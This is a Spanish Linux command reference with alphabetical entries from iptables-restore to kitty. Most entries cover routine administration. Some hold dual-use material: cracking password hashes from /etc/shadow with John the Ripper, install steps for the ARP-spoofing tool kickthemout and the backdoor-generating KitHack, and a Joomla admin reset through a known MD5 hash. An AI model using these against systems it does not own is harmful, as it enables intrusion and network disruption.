# iptables-restore < /etc/iptables/rules.v4
# ip6tables-restore < /etc/iptables/rules.v6
Tambien puede usarse cuando se se pueden gardar y releer el archivo con netfilter-persisten que viene con el mismo paquete iptables-persisten:
# netfilter-persistent reload
# netfilter-persistent save
O borrar las reglas de iptables:
# netfilter-persistent flush


iptotal
Monitor de tráfico IP. Mide el uso del ancho de banda.
# iptotal eth0 -r 60 (Escuchará 60 segundos antes de informar)
# iptotal eth0 -r 120 -d 3 -P  (con alto nivel de depuarión[-d 3] y modo promiscuo [-P]


iptraf
Muestra información en tiempo real sobre el tráfico de red.
# iptraf -i eth0 (Analiza todo el trafico de la red eth0)
# iptraf -i all (Analiza el de todas las redes)
# iptraf -s eth0 (Analiza el tráfico agrupandolo por protocolo y puerto)
# iptraf -z eth0 (Contabiliza paquetes y agrupa por tamaño)
Una vez lanzada la aplicación, para salir pulsar X


ipwatchd
Demonio que analiza todos los paquetes ARP entrantes para detectar conflictos de IP. Se puede configurar para escuchar en una o más interfaces en modo activo o pasivo. En modo activo, IPwatchD protege el host antes de que se apodere de la IP respondiendo solicitudes ARP gratuitas recibidas de sistemas en conflicto. En modo pasivo, simplemente registra información sobre conflictos a través de la interfaz syslog estándar. La mencionada configuración ha de realizarse en el archivo:
# nano /etc/ipwatch.conf
  iface_configuration automatic
  #iface eth0 active
  #iface eth0:0 passive
  defend_interval 10
  user_script /usr/sbin/ipwatchd-script
  syslog_facility daemon
# ipwatchd -c /etc/ipwatchd.conf -d (activar el daemon)


irb
Interprete de comandos interactivo de ruby. Para entrar en la shell:
	$ irb
	irb(main):001:0> print "Hola mundo"
	Hola mundo=> nil
	irb(main):002:0> exit
	$
Explicación de la salida:
	irb(main) (que estás en la consola de irb y en el contexto de un programa)
	:001 (La linea en la que te encuentras)
	:0 (Profundidad. Por ejemplo en Ruby los IF terminan con END. Si ponemos un IF sin el END, el ":0" cambia a ":1" al ponerlo retorna al valor ":0". Si colocamos varios IFS anidados, entonces el nivel de profundidad dirá :1 nivel de profundidad, :2 niveles de profundidad, :3 niveles de profundidad y así sucesivamente)
	print ... (Comando a ejecutar)
	Hola ... (Ejecución)
	==> nil (Final del proceso)
	exit (Salir del interprete)


irpas
Paquete que contiene una colección de programas utilizados para operaciones de red avanzadas, pruebas y depuración. Los paquetes incluidos son los siguientes:
    - cdp - remitente del paquete del protocolo de descubrimiento de Cisco
    - igrp - inyector de ruta IGRP
    - ass - Escáner de sistema autónomo
    - irdp - remitente IRDP
    - irdpresponder - respondedor IRDP
    - itrace - trazado de ruta basado en ICMP
    - tctrace - Traceroute basado en TCP SYN
    - protos - escáner de puertos basado en ICMP
    - netmask - pide máscara de red a través de ICMP
    - file2cable - Vuelca cualquier archivo binario directamente a ethernet
    - dfkaa: soluciona problemas de dispositivos anteriormente conocidos como Ascend (Pipeline, etc.)
    - netenum: escáner de ping diseñado para scripts de shell
    - hsrp: probador de conmutación por error HSRP
    - icmp_redirect - Sistema de redireccionamiento ICMP
    - timestamp - Solicitante de marca de tiempo ICMP
    - dhcpx - "ejercitador" del servidor DHCP


irssi
Chatear via terminal.
$ irssi (Arrancar la aplicacuón)
	set nick el_nick (establecer nick habitual)
	set quit_message Mi Mensaje de salida (mensaje que se mostrará al salir del xat)
	save (Obligatorio para guardar todos los cambios)
	network list (lista de las redes existentes)
	network remove nombre_de_red (borrar una red)
	server list  (lista de todos los servidores guardados)
	server remove nombre_de_servidor  (borrar un servidor)
	connect la_red  (Conectar a una red))
	channel add -auto #canal la_red (Conexión automática a determinado canal de una red)
	list *linux *   (ver listado de canales que tengan “linux” por titulo)
	join #canal (Después de conectar con una red, entrar en determinado canal)
	part  #canal mensaje (salir de un canal con un mensaje)
	quit (cierra la aplicación)
	disconnect servidor  (desconecta de un servidor)
	msg usuario un_mensaje  (Manda un mensaje privado a un usuario)
	nick  otro_nick> (Cambiar de nick)
	close usuario  (cierra la ventana de un usuario)
	dcc usuario fichero  (inicia la transferencia de un archivo con usuario)
	exit (desconecta el servidor)
	channel (muestra informacion sobre un canal y los usuarios conectados)
	win #ventana  (cambiar de ventana. igual que con ESC + num de ventana)
	script list   (Listado)
	help script (ayuda)
	nick el_nick:contraseña (logearse con nombre de usuario y contraseña)
	msg el_nick set la_contraseña nueva_contraseña (modificar contraseña)
	crear una red y servidores:
	network add mi_red (crear una red local [mi_red])
	server add -auto -network mi_red la_red 6667 password  (Establecer que la red local [mi_red] se conecte automaticamente al arrancar a una red externa [la_red], especificando puerto y contraseña si procede, en caso contrario suprimir estos dos últimos parámetros).
Instalar nuevos themes:
Descargar de la pagina oficial de irssi (http://irssi.org/themes) y moverlos a la carpeta ~/.irssi. Para instalarlos:
	set theme nombre.theme
	save
Para la instalacion de Scripts, descargarlos de la pagina oficial (<http://scripts.irssi.org/>) y moverlos a la carpeta ~/.irssi/scripts/ si deseamos cargarlos o descargarlos manualmente:
	script load nombre_script   (Cargarlo)
	script unload nombre_script (Descargarlo)
0 moverlos a la carpeta ~/.irssi/scripts/autorun para que se carguen automaticamente.
Nota.- Algunos de estos scripts necesitan para funcionar correctamente de algunas librerias.
Habilitar un registro de las conversaciones:
# mkdir /var/log/irssi  (Crear la carpeta)
# chown usuario:users /var/log/irssi (Asignar permisos)
Arrancar irssi y teclear:
	set autolog ON
	set autolog_path /var/log/irssi/$tag/$0.log
	save
# touch /etc/logrotate.d/irssi
# nano /etc/logrotate.d/irssi
Agregar el siguiente contenido:
	/var/log/irssi/*/*.log {
	copytruncate
	compress
	notifempty
	missingok
	}


ischroot
Detectar si se está ejecutando en un chroot. El estado de salida es:
	0 (si actualmente se ejecuta en un chroot)
	1 (si actualmente no se está ejecutando en un chroot)
	2 (si la detección no es posible)
# ischroot -f (Salir con el estado 1 si la detección no es posible)
# ischroot -t (Salir con estado 0 si la detección no es posible.


iso_8859-1
El estándar ISO 8859-1 es un conjunto de caracteres codificados en octal, decimal y hexadecimal para el juego de caracteres ASCII que son los más utilizados por muchos idiomas de Europa occidental. También conocida como Latin1
$ man iso_8859-1 (muestra los caracteres unicode)
$ µ (ctrl-shift-u b5 intro)


isoinfo
Información sobre una iso
$ isoinfo -d -i archivo.iso


isoquery
Este programa se puede utilizar para generar una salida tabular de los códigos estándar ISO proporcionados por el paquete iso-codes. Por defecto usa la ISO 3166-1 pero puede especificarse con el argumento -i cualquiera: 639-2, 639-3, 639-5, 3166-1, 3166-2, 3166-3, 4217, 15924.
$ isoquery -l es -o (en español y nombre oficial)


isosize
muestra el tamaño de un sistema de ficheros iso9660 en bytes
$ isosize archivo.iso


ispell-autobuildhash
Es un script que gestionará los archivos hash de ispell autobuild, destinados a ser llamados desde las herramientas comunes de los diccionarios. Dependiendo del nivel de compatibilidad ispell y del nivel de compatibilidad utilizado para el archivo hash si está presente, decidirá si debe ser reconstruido o no. Este script solo funcionará en paquetes ispell preparados para usarlo, no hará nada por otros paquetes de diccionarios ispell.
# ispell-autobuildhash --force


issue.net
Muestra la distro instalada.
$ cat /etc/issue.net


isympy
Es un shell de Python para SymPy. Es solo un shell python normal [ipython shell si está instalado el paquete ipython]. Para salir: exit()
$ isympy -p no -c python (iniciar la shell sin decoración extra)


isutf8
[moreutils]. No muestra salida si el archivo tiene una codificación UTF-8 válida. Si no es el caso muestra el aviso.
$ isutf8 archivo


itop
Cuando un componente del hardware necesita un recurso, envia una petición de interrupción al sistema llamado IRQ y este suspende momentáneamente alguna rutina de servicio para continuarla cuando finaliza la interrupción. itop muestra estas interrupciones que vendrian a ser lo mismo que actualizar cada segundo el archivo /porc/interrupts:
	# watch -n 1 cat /proc/interrupts
# itop
Cuando está en ejecución, las teclas de control son:
	a (Muestra todos los procesos, no solo los en uso)
	t (Muestra el clásico top [ver])
	q (Sale de "t" cierra la aplicación)
# itop -n 10 (Sólo muestra 10 procesos)


ivstools
[aircrack-ng]
Herramienta para unir/convertir archivos .ivs y .cap
$ ivstools --merge captura1.ivs captura2.ivs captura3.ivs total.ivs
$ ivstools --captura.cap nuevo.ivs


iwconfig
Relacionado con direcciones ip y dispositivos de red inalámbricos
# iwconfig (Ver los datos de conección de la red inalámbrica)
# iwconfig eth0 (Si se asocia la tarjeta de red con la conección)
# iwconfig wlan0 mode Managed  (activar el modo managed)
# iwconfig wlan0 mode monitor (activar modo monitor)
# iwconfig wlan0 key open CLAVE  (ingresar contraseña, si la hay. Si omitimos “open” se interpreta que la clave es “restricted”)
# iwconfig wlan0 essid ESSID (ESSID= nombre de la red)
Crear una Red Wifi AdHoc
$ iwconfig wlan0 mode Ad-Hoc
$ iwconfig wlan0 essid "nombre_de_la_red"
$ iwconfig wlan0 key s:clave
$ ifconfig wlan0 xx.xx.xx.xx netmask yy.yy.yy.yy


iwlist
# iwlist eth0 scan  (scaneo de los puntos de acceso cercanos)
# iwlist s    (Lo mismo para todas las interficies)


jackd
[jackd2]. JACK [JACK Audio Connection Kit] es un servidor de sonido de baja latencia que permite que varias aplicaciones se conecten a un dispositivo de audio y compartan audio entre ellas. Incluye los siguientes ejecutables: alsa_in, alsa_out, jack_alias, jack_bufsize, jack_connect, jack_control, jack_cpu, jack_cpu_load, jack_disconnect, jack_evmon, jack_freewheel, jack_iodelay, jack_latent_client, jack_load, jack_lsp, jack_metro, jack_midi_dump, jack_midi_latency_test, jack_midiseq, jack_midisine, jack_monitor_client, jack_multiple_metro, jack_net_master, jack_net_slave, jack_netsource, jack_property, jack_rec, jack_sampleraten, jack_server_control, jack_session_notify, jack_showtime, jack_simdtests, jack_simple_client, jack_simple_session_client, jack_test, jack_thru, jack_transport, jack_unload, jack_wait, jack_zombie, jackd y jackdbus. Crear el archivo:
# nano /etc/security/limits.d/audio.conf
Y en el pegar las lineas:
USER   -  rtprio     95
USER   -  memlock    unlimited
En USER el que corresponda.
$ jackd -d alsa (inicia el servidor jackd utilizando el controlador ALSA)
$ jackd -d alsa -d hw:0 (especificar qué interfaz de audio deseas usar. hw:0, que corresponde a la primera tarjeta de sonido)
$ jackd -d alsa -r 48000 -p 256 (ajustar la latencia y calidad del audio a una tasa de muestreo de 48 kHz y un tamaño de búfer de 256 muestras)
$ jackd -d firewire (iniciar jackd con el controlador firewire)
$ jackd -d dummy (útil cuando no necesitas audio físico, pero aún deseas realizar conexiones entre aplicaciones. Se utiliza normalmente para pruebas)
$ jackd -R -d alsa (mejorar el rendimiento ejecutando jackd en modo tiempo real)
$ jackd -d alsa -r 44100 -p 512 & (que las aplicaciones que usan PulseAudio, como los reproductores de música, es común iniciar JACK y luego conectar ambos servidores)
$ pactl load-module module-jack-source
$ pactl load-module module-jack-sink
$ jackd -d alsa -P hw:0 -C hw:1 (seleccionar dispositivos de entrada y salida, -P: especifica el dispositivo de salida y -C: especifica el dispositivo de entrada)
El argumento "help" se puede usar con el dispositivo elegido:
              jackd -d alsa --help
              jackd -d coreaudio --help
              jackd -d net --help
              jackd -d dummy --help
              jackd -d firewire --help
              jackd -d oss --help
              jackd -d sun --help
              jackd -d portaudio --help


jargon
Compendio completo de jerga hacker que ilumina muchos aspectos de la tradición, el folklore y el humor hackish en lengua inglesa. El archivo está en formato de información, pero incluye una página HTML con enlaces al sitio de inicio. Este paquete está desactualizado porque el autor ya no mantiene una versión informativa del archivo.
$ jargon


java
Lenguaje de programación
$ java -jar fichero.jar  (Ejecuta un programa escrito en java)


jekyll
Script de ruby para transformar texto plano en páginas web estáticas y blogs.
# gem install jekyll (Instalar la gema)
$ jekyll new mi_sitio (crear el directorio del site)
$ cd mi_sitio (Entrar en el directorio creado)
$ jekyll build (Generar el site)
$ jekyl serve --watch (Acceder a la versión local del site en http://localhost:4000. El argumento --watch permite que si se realizan cambios en los archivos, éstos se puedan ver inmediatamente recargando la página del navegador)


jhead
mostrará toda la metainformación incrustada en un fichero JPG incluyendo la miniatura [thumbnail] de la foto original
$ jhead -st miniatura.jpg imagen_para_analizar.jpg
$ jhead -dt imagen.jpg  (borrar el thumbnail)
$ jhead -mkexif imagen.jpg (borra datos)
$ jhead -purejpg imajen.jpg (borra efix)
$ jhead -n%Y-%m-%d_%H-%M-%S *.jpg (Renombrar con la fecha y hora de la metainformación)


jnettop
Monitor del tráfico de red ordenado por el ancho de banda utilizado.
# jnettop


jobs
Informa sobre los trabajos en ejecución pendientes de finalización que se encuentran en backgroud.
$ jobs (uso básico)
$ jobs -l (Mostrar también el ID)
$ jobs -p (Mostrar sólo el ID)
Algunas opciones:
	-r (Mostrar sólo las que están procesandose)
	-s (Sólo las que están paradas)


joe
Editor de texto
$ joe -linums fichero (Abre fichero numerando las lineas)
Algunas teclas de control ["^k h" significa pulsar la tecla Ctrl y sin soltarla pulsar la letra “k”, soltar estas teclas y pulsar “h”]
	^k h (Abrir/cerrar ventana de ayuda. Con esc . se avanza en las ventanas de ayuda y con esc , se retrocede)
	^k d (Guardar archivo sin salir)
	^k x (Guardar y salir)
	^c (Salir sin guardar)
	^k f (Buscar palabra)
	^u (Pantalla anterior)
	^v (Pantalla siguiente)
	^a (Ir al principio de linea)
	`e (Ir al final de la linea)
	^k u (Ir al principio del documento)
	^k v (Ir al final del documento)
	^d (Borrar caracter)
	^y (Borrar linea)
	^w (Borrar palabra siguiente)
	^o (Borrar palabra anterior)
	^_ (Deshacer)
	^c (Cancelar)


john
Herramienta que permite averiguar contraseñas encriptadas
El de los repositorios acostumbra a estar capado. Descargar el programa y el parche de:
$ wget http://www.openwall.com/john/g/john-1.7.3.4.tar.gz
$ wget http://openwall.info/wiki/_media/john/john-1.7.3.1-generic-crypt-1.diff.gz
Descomprimir:
# tar xvzf john-1.7.3.4.tar.gz
Entrar al directorio del programa:
# cd john-1.7.3.4
Aplicar el parche:
# gzip -dc ../john-1.7.3.1-generic-crypt-1.diff.gz | patch -p1
  patching file src/Makefile
  patching file src/crypt_fmt.c
  patching file src/john.c
  Hunk #2 succeeded at 67 (offset 2 lines).
El directorio donde se encuentra el código fuente es src:
# cd src
# make
Con make obtendrá una lista de los sistemas soportados, luego:
# make linux-x86-64
Si el sistema no esta en la lista:
# make clean generic
Pruebas de detección de correcto funcionamiento.
# cd ../run
# ./john --test
El fichero john.pot contiene los resultados encontrados por john. Si el fichero no está vacío significa que john ha encontrado la contraseña. El fichero john.rec contiene el estado actual de la búsqueda por si se produce una interrupción y es utilizado por el programa para reanudar la búsqueda.
1.-
Comprobación de la fortaleza de nuestra constraseñas:
# unshadow /etc/passwd /etc/shadow > contraseñas.txt
# john contraseñas.txt
# john --single contraseñas.txt (usandolo el modo single)
# john --incremental contraseñas.txt (Usando el modo incremental)
# john --wordlist=diccionario.lst --rules contraseñas.txt (Usando un diccionario)
# john --show contraseñas.txt (Ver resultados)


join
Muestra lineas coincidentes
$ join fichero1 fichero2
$ join -v 1 fichero1 fichero2 (mostrar líneas de fichero1 que no existen en  fichero2)


joomla
Recuperar la clave para acceder al administrador.
Instalar webmin y desde el navegador: https://localhost:10000
En servidores -> Servidor BD MySQL clicar sobre la base de datos de joomla, editar la tabla jos_users i mostrar los datos id. Los usuarios estan numerados a partir del número 62. Editamos la fila del administrator admin (por ejemplo), borramos la clave y le ponemos esta:
	1c7a92ae351d4e21ebdfb897508f59d6
Guardar y entrar como administrator en nuestra web con el nombre de usuario: admin y la contraseña: holamundo
Luego volver a modificar la contraseña desde el panel de control de joomla.


jot
[athena-jot]. Mostrar secuencias de datos o datos aleatorios.
$ jot 5 (Mostrar del 1 al 5)
$ jot 5 20 (Mostrar 5 números consecutivos a partir del 20)
$ jot 7 20 30 (Mostrar 7 números entre el 20 y el 30)
$ jot 7 20.00 30.00 (Mostrar 7 números del 20 al 30 con 2 decimales)
$ jot -p2 7 20 30 (Lo mismo con el parámetro p)
$ jot - 20 30 2 (Omitiendo el parámetro de la cantidad de números [-] y del 20 al 30 saltando de 2 en 2)
$ jot -r 4 10000 99999 (4 números aleatorios entre los especificados)
$ jot -s " " -b "-x-" 20 (20 caracteres especificados [-b] separados por un espacio [-s])
$ jot -s "" -c 26 a (26 letras [-c] empezando por la A y sin espacio entre ellas)


journalctl
Sistema de registro [log] propio de systemd.
# journalctl (Leer el registro)
# journalctl -b (Mostrar todos los mesajes de arranque)
# journalctl -n (muestra los últimos 10)
# journalctl -n 20 (muestra los últimos 20=
# journalctl -b -0 (Muestra los mensajes del arranque actual)
# journalctl -b -1 (Muestra los mensajes del arranque anterior)
# journalctl -b -2 (Muestra los mensajes desde los dos últimos arranques)
# journalctl --list-boots (Muestra los últimos arranques guardados por el sistema. Si el sistema no guarda los registros de arranque hay que editar el fichero /etc/systemd/journald.conf y añadir/editar la línea Storage=persistent dentro de la sección [Journal])
# journalctl -b 27487d1e4b1241df93a55949aef01161 (También se puede consultar los mensajes de un arranque en concreto poniendo el identificador que aparece con --list-boots)
# journalctl -f (Seguir los mensajes nuevos)
# journalcrl -k (registro de mensajes del kernel desde el último inicio)
# journalctl -p crit (ver los registros según su prioridad crítica)
# journalctl _PID=1 (Mostrar mensajes por su PID)
# journalctl -u sshd (Mostrar mensajes de una unidad especifica)
# journalctl --since yesterday (Muestra los mensajes des de el día de ayer. Los de hoy "today")
# journalctl --since "2016-09-13" (Muestra los mensajes des de el día especificado en el formato YYYY-MM-DD)
1.-
Hacer que el demonio syslog funcione con journal
# systemctl enable syslog-ng


jp2a
Convertir imagenes jpeg a ascii.
$ jp2a imagen.jpg (forma básica)
$ jp2a imagen1.jpg imagen2.jpg imagen3.jpg (convertir varias imágenes)
$ jp2a imagen.jpg --output=imagen_ascii (redirigir la salida a un archivo)
$ jp2a --background=light -b --colors imagen.jpg  (Sin fondo, con borde y color)
$ jp2a --color --html --fill --html-title=Imagen --background=dark entrada.jpg –output=salida.html (con un html de salida lcon título)
$ jp2a --html-no-bold URL/imagen.jpg  (Con una URL de entrada y sin caracteres en negrita)
$ jp2a --height=30 imagen.jpg (con una altura de 30 filas)
$ jp2a --weight=30 imagen.jpg (con una anchura de 30 filas)
$ jp2a --height=30 --width=50 imagen.jpg (con una altura de 30 y una anchura de 50)
$ jp2a --size=50x30 --border imagen.jpg (con borde)
$ jp2a --background=dark imagen.jpg (con fondo oscuro)
$ jp2a --background=light imagen.jpg (con fondo claro)


jpeginfo
Información y test de integridad de imagenes jpeg.
$ jpeginfo -c imagen.jpeg (comprobar el archivo en busca de errores)
$ jpeginfo -5 imagen.jpeg (Muestra el md5 de la imagen)
$ jpeginfo -i -v imagen.jpeg (maxima información de archivo especificado)


jpegjudge
Determina la calidad de un jpeg en una escala de 0 [menor] a 1000 [mayor calidad]
$ jpegjudga -b imagen.jpeg (Mostrar solo el número)
Nota.- Puede observarse el deterioro pasando un jpeg a png y volver a pasarlo a jpeg y comparar los resultados del primer jpeg y el último.


jpegoptim
Optimizar archivos .jpeg. Por defecto se sobreescriben los originales. Si no es posible la optimización no produce salida.
$ jpegoptim imagenes/*.jpg (Forma básica de todas las de un directorio)
$ jpegoptim imagen.jpg -d optimizado (Colocando la optimización en otro directorio)
$ jpegoptim -f imagen.jpg (Forzando optimización incluso si el resultado es más grande que el original)
$ jpegoptim -t imagen.jpeg (borrando los marcadores en el archivo de salida)


jpegtran
Eliminar información y reducir, modificar o recortar tamaño de imagenes jpeg.
$ jpegtran -copy none optimize original.jpg resultado.jpg (Eliminando información oculta [-copy none] y reduciendo la imagen [-optimize])
Algunas opciones:
-grayscale (Forzar salida a escala de grises)
-rotate 90 (Rotar 90º)
-flip horizontal (Imagen espejo horizontal [izquierda-derecha])
-flip vertical (Imagen espejo vertical [arriba-abajo])


jumanji
Navegador estilo vi con soporte flash.
Configuración:
$ nano .config/jumanji/jumanjirc
# jumanji configuration
# search engines
searchengine gg http://google.es
searchengine yo http://www.youtube.com/results?search_query=%s&aq=f
# browser settings
set homepage http://www.lapipaplena.com
set auto_save 60
set single_instance false
# downloads
set download_dir ~/downloads/
set download_command urxvt -e  wget --load-cookies ~/.config/jumanji/cookies '%s' -O '%s';
# look
set font droid sans mono medium 8
# key bindings
map <C-q> quit
# session
set default_session_name start
set session_restored true
# Enable plugins
plugin application/x-shockwave-flash
Atajos:
	o (entrar URL)
	t (entrar URL en nueva ventana)
	j (bajar por la página)
	k (subir)
	h (ir a la izquierda)
	k (ir a la derecha)
	^f (Descenso al final de la página)
	^b (Regreso al inicio de la página)
	w (abrir una dirección en una nueva ventana)
	^w (Cerrar ventana)
	^Tab (Cambiar de pestaña)
	^I (página anterior)
	^o (página siguiente)
	? (Buscar palabra)
	r (Recargar la página)
	R (Recargar ignorando la caché)
	y (Copiar la dirección de la página al portapapeles)
	^s (Mostrar código fuente)
	^q (Salir)


katoolin
[git python]. Instalar las herramientas de kali linux. Descarga:
$ git clone https://github.com/LionSec/katoolin.git
$ cd katoolin
$ python katoolin.py (entrar en la aplicación. Permite entre otras cosas, agregar los repositorios de kali linux, crear un menú o actualizarlos)


kbdrate
Establece la tasa de repetición del teclado y el tiempo de retardo en las tty.
# kbdrate -d 200 -r 10 (establece retardo de 200 milisegundos y velocidad de repetición de 10 por segundo)


kernel
1.-
Suprimir kernels antiguos
# uname -r   (para conocer el último)
# dpkg --get-selections | egrep linux-image
linux-image-2.6.17-11-generic install
linux-image-2.6.20-15-generic install
linux-image-2.6.20-16-generic install
Dejar el actual y suprimir los otros:
# apt-get remove --purge linux-image-2.6.17-11-generic
2.-
Instalar nuevo kernel:
Para el ejemplo descargaremos el kernel 3.3.6 para la versión de ubuntu 12.04 [http://kernel.ubuntu.com/~kernel-ppa/mainline/v3.3.6-precise/] para la arquitectura amd64. De los varios archivos que encontramos en la página, para lo que nos ocupa, solo interesan los linux-headers y linux-image.
$ wget http://kernel.ubuntu.com/~kernel-ppa/mainline/v3.3.6-precise/linux-headers-3.3.6-030306_3.3.6-030306.201205121335_all.deb
$ wget http://kernel.ubuntu.com/~kernel-ppa/mainline/v3.3.6-precise/linux-headers-3.3.6-030306-generic_3.3.6-030306.201205121335_amd64.deb
$ wget http://kernel.ubuntu.com/~kernel-ppa/mainline/v3.3.6-precise/linux-image-3.3.6-030306-generic_3.3.6-030306.201205121335_amd64.deb
La instalación se realiza en el mismo orden de descarga:
# gdebi linux-headers-3.3.6-030306_3.3.6-030306.201205121335_all.deb
# gedbi linux-headers-3.3.6-030306-generic_3.3.6-030306.201205121335_amd64.deb
# gedbi linux-image-3.3.6-030306-generic_3.3.6-030306.201205121335_amd64.deb
Después de la instalación del kernel, instalar los drivers privativos tipo nvidia o ati. Y actualizar grub:
# update-grub
3.-
[libncurses5 libncurses5-dev]
Compilar el kernel desde el codigo fuente. Puede ser util para habilitar soporte para algun nuevo periferico no soportado por el kernel por defecto. Escoger la ultima version del nucleo estable de kernel.org. Para el ejemplo usaremos la 3.9.11.
# cd /usr/src
# wget https://www.kernel.org/pub/linux/kernel/v3.x/linux-3.9.11.tar.gz
# tar -zxvf linux-3.9.11.tar.gz
# cd linux-3.9.11
# make menuconfig/
Mostrara las opciones de configuracion por defecto que podran ser modificadas para nuestra maquina especifica. Una vez terminado, "guardar" como .config
# make (Compilar)
# make modules_install (Instalar los modulos)
# make install (Instalar el nuevo kernel en el sistema)
La instalacion ya modifica el grub.cfg para que el sistema arranque con el nuevo kernel. Si este da problemas puede escogerse para el arranque el antiguo que constara en el menu de Grub. Puede verificarse el nuevo kernel con:
$ uname -r
4.-
Borrar kernels antiguos de forma automática:
	# apt-get purge $(dpkg -l 'linux-*' | sed '/^ii/!d;/'"$(uname -r | sed "s/\(.*\)-\([^0-9]\+\)/\1/")"'/d;s/^[^ ]* [^ ]* \([^ ]*\).*/\1/;/[0-9]/!d' | head -n -1) --assume-yes


kernel-install
Se usa para instalar o eliminar imágenes del kernel en initrd hacia y desde la partición del cargador de arranque, denominado $BOOT. Por lo general, será /boot/, /efi/ o /boot/efi/. Kernel-Install ejecutará los archivos ejecutables [plugins] ubicados en el directorio /usr/lib/kernel/install.d/ y el directorio de administración local /etc/kernel/install.d/. Todos los archivos se clasifican y ejecutan colectivamente en orden léxico, independientemente del directorio en el que esten. Los archivos de /etc/kernel/install.d/ tienen prioridad sobre archivos con el mismo nombre en /usr/lib/kernel/install.d/. Esto se puede usar para anular un sistema suministrado con un archivo local si es necesario, con un enlace simbólico en /etc/kernel/install.d/ con el mismo nombre que un ejecutable de /usr/lib/kernel/install.d/, señalando a /dev/null, deshabilita completamente el ejecutable. Los ejecutables deben tener la extensión ".install"; Se ignoran otras extensiones. Un ejecutable colocado en estos directorios debería devolver 0 en caso de éxito. También puede devolver 77 para provocar que finalice toda la operación (se omitirán los ejecutables posteriores en orden léxico). Para ver versiones del kernel instaladas:
$ ls /usr/lib/modules/


kerneltop
muestra el uso del kernel en estilo interactivo como top [ver]
# kerneltop -l 45 -s 5 (Que muestre 45 lineas [por defecto 50] y actualización cada 5 segundos [por defecto 1])


kesty-whatsapp
Aplicación de whatsapp para pc. La instalación es via snap [ver] y los comandos que se aplican a kesty-whatsapp son los genericos de snap, por tanto lo primero es instalar snap:
$ apt install snapd
$ snap install kesty-whatsapp
$ snap run kesty-whatsapp (arrancar kesty-whatsapp. Pide ingresar el código QT en el móvil para activar la aplicación)


keyctl
[keyutils]. Este programa se utiliza para controlar la instalación de administración de claves de varias maneras usando una variedad de subcomandos.
$ keyctl list @us (Enumerar las claves actuales en la sesión predeterminada del usuario)
$ keyctl show
$ keyctl read 898972716 (Leer una clave de la salida anterior y formatearla en hexadecimal si no se puede imprimir)
$ keuctl pipe 898972716 (Leer una clave y formatearla tal como está)
$ keyctl session
$ keyctl (muestra la gran variedad de subcomandos que pueden emplearse)


kickpass
Forma simple de crear contraseñas seguras
# kickpass init (inicia un nuevo directorio seguro de contraseña. Predeterminado a ~/.kickpass)
# kickpass create palabra (Crea una nueva contraseña segura)
# kickpass open palabra (Abrir una contraseña segura e imprimir su contenido en stdout)
# kickpass list (lista contraseñas disponibles)
# kickpass delete palabra (Eliminar contraseña)
# kickpass rename antiga nueva (Cambiar el nombre de una contraseña)


kickthemout
[nmap]. Herramienta que usa el envenenamiento ARP o ARP Spoofing que mata la conectividad a Internet del o los dispositivos conectados a una red de área local, siempre que la configuración de seguridad de la red no impida dichos ataques.
Descarga y requerimientos:
$ git clone https://github.com/k4m4/kickthemout.git
$ cd kickthemout/
$ sudo -H python -m pip install -r requirements.txt
$ sudo python kickthemout.py
Al lanzar la aplicación:
# python kickthemout.py
Muestra 3 posibilidades, matar uno, varios o todos los dispositivos y el bloqueo dura mientras el comando está en ejecución por tanto el bloqueo es temporal.


kill
Enviar señales a los procesos.
$ kill -l	    (lista todas las señales que pueden mandarse a un proceso)
$ kill -0             (mata todos los procesos de la shell)
$ kill -9  pid      (mata el proceso indicado con el número PID)
# kill -9 `lsof -t -i :22` (Mata el proceso que corre en el puerto 22)
$ kill -1 pid  (reinicia el servicio indicado en PID)
$ kill %2 (mata el proceso número 2)
$ kill -19 pid  (Parar un proceso de forma temporal. Con -18 se reanuda)
Algunas muestras del número y su equivalencia:
2 SIGINT (Interrumpido desde el teclado [igual que Ctrl+c])
3 SIGQUIT (Cerrado desde el teclado [igual que Ctrl+\])
9 SIGKILL (forzar que uno o varios procesos terminen de forma inmediata)
18 SIGCONT (Reanudar un proceso parado)
19 SIGSTOP (suspender un proceso)
20 SIGTSTP (Parar un proceso desde terminal [igual que Ctrl+z])
Nota.- Si en vez de usar los números [kill -9 pid] usamos el nombre de la señal [kill -KILL pid] podemos omitir las letras SIG de la señal [SIGKILL]


killall
Mata el proceso de la aplicación especificada
$ killall -9 scribus
$ killall gnome-panel (reiniciar los paneles)
$ killall -INFO dd  (chequear el estado de un proceso dd)
$ killall -u usuario (Matar los procesos de un	 usuario)
$ killall -l (listado de todas las señales)
$ killall -s SEGV


killer
Elimina los trabajos en segundo plano, Cuando se instala el paquete, se instala un trabajo cron para ejecutar Killer una vez por hora.
$ killer (forma básica)
$ killer -d -n (activar debur en la salida y sin matar los procesos, solo imprimiendo el resultado)


kippo
[python-foolscap pycrypto python2-zope-interface twisted python2-pyopenssl python-foolscap python2-pyasn1]. Construir un honeypot por ssh.
Descargar y desenpaquetar kippo:
$ wget https://kippo.googlecode.com/files/kippo-0.5.tar.gz
$ tar xzf kippo-0.5.tar.gz
$ cd kippo-0.5
$ ./start.sh
Configuración de iptables:
# iptables -A INPUT -i eth0 -p tcp --dport 22 -j ACCEPT
# iptables -A INPUT -i eth0 -p tcp --dport 2222 -j ACCEPT
# iptables -A PREROUTING -t nat -i eth0 -p tcp --dport 22 -j REDIRECT --to-port 2222
Los intentos de acceso ssh quedan registrados en el subdirectorio log:
$ cd kippo-0.5/log
$ tail -f kippo.log


kismet
Identifica redes inalambricas de forma pasiva recolectando paquetes, detecta redes ocultas, clientes asociados y es capaz de sniffar el tráfico de las redes no encriptadas.
# nano /etc/kismet/kismet.conf
Buscar la linea:  source=none,none,addme
Y sustituirla por:  source=ath5k,eth1,wifi
en la que “ath5k” es el driver que usamos, “eth1” la interfaz de red y “wifi” cualquier nombre.
También en este archivo pueden configurarse otros parámetros (Puerto, host permitido, máximo de clientes, logs...) :
	tcpport=2501
	allowedhosts=127.0.0.1
	maxclients=5
	logtemplate=/var/log/kismet/
En el directorio de logs, los archivos que interesan son los .pcap que pueden visionarse con wireshark.
# kismet   (lanzar la aplicación)


kithack
[python2.7 python-pip]. Es un proyecto de código abierto que contiene 130 herramientas enfocadas al hacking y automatiza el proceso de descarga e instalación para la herramienta que usted desee. KitHack también nos brinda la facilidad de poder generar puertas traseras con diferentes tipos de Payloads tanto para Linux, Windows, Android y MAC OS.
Instalación:
$ git clone https://github.com/AdrMXR/KitHack.git
$ cd KitHack
$ ./install.sh
# python KitHack.py


kitty
Emulador de terminal.
Algunas combinaciones de teclas:
    C+S+t ─ Crear una pestaña nueva.
    C+S+q ─ Cerrar una pestaña.
    C+S+→ ─ Pestaña siguiente.
